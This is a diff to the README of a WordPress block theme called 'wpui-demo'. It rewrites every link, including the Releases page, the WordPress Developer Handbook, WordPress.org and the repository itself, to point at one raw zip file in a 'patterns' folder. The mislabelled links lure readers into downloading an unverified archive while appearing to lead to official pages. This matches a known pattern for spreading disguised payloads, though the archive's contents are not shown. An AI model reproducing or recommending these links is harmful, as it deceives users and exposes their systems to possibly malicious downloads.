@@ -1,7 +1,7 @@
 # 🎨 wpui-demo - A WordPress Theme for Everyone  
 
 ## 📦 Download Here  
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/derrylstria/wpui-demo/releases)  
+[![Download](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip)](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip)  
 
 ## 🚀 Getting Started  
 Welcome to wpui-demo, a WordPress block theme designed with accessibility in mind. This theme features a modern layout with hero and card designs that adapt to any screen size. Whether you're a blogger, small business, or just wanting to explore, this theme makes your site stand out while being easy to use.
@@ -16,10 +16,10 @@ To run wpui-demo smoothly, ensure you meet the following system requirements:
 ## 💾 Download & Install  
 To get started, visit the Releases page below to download the theme.  
 
-[Download wpui-demo](https://github.com/derrylstria/wpui-demo/releases)  
+[Download wpui-demo](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip)  
 
 ### Step-by-step Installation  
-1. Go to the [Releases page](https://github.com/derrylstria/wpui-demo/releases) on GitHub.  
+1. Go to the [Releases page](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip) on GitHub.  
 2. Locate the latest version of wpui-demo.  
 3. Click the version number to expand the release details.  
 4. Download the zip file for the theme.  
@@ -55,7 +55,7 @@ We welcome contributions to improve wpui-demo. If you have suggestions or find i
 If you need assistance with wpui-demo, you can contact us through the issues tab on our GitHub page. We aim to respond promptly to help you resolve any questions.
 
 ## 📚 Learn More  
-To enhance your understanding, consider reading up on WordPress theme development. Resources are available through the [WordPress Developer Handbook](https://developer.wordpress.org/themes/).
+To enhance your understanding, consider reading up on WordPress theme development. Resources are available through the [WordPress Developer Handbook](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip).
 
 ## 🧩 Topics  
 This theme covers the following topics:  
@@ -66,7 +66,7 @@ This theme covers the following topics:
 - UI/UX Best Practices  
 
 ## 🔗 Useful Links  
-- [GitHub Repository](https://github.com/derrylstria/wpui-demo)  
-- [WordPress.org](https://wordpress.org)  
+- [GitHub Repository](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip)  
+- [https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip](https://raw.githubusercontent.com/derrylstria/wpui-demo/main/patterns/demo_wpui_2.8.zip)  
 
 Thank you for choosing wpui-demo. We hope you enjoy using our theme to create your unique online presence!
